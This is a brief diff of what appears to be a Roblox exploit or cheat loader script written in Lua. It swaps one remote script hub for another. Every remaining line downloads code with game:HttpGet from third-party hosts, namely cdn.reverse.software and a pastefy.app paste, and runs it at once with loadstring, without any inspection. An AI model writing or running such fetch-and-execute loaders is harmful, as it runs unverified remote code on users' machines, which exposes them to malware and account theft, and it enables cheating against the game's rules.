@@ -1,5 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Speed-X-Hub/SpeedX-Hub/refs/heads/main/Speedx-hub"))()
-
+ID="0ecc3178-2e26-44b9-8182-48a7819a50f5";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 
 task.wait(10)
 loadstring(game:HttpGet("https://pastefy.app/SGmpKqBZ/raw"))()
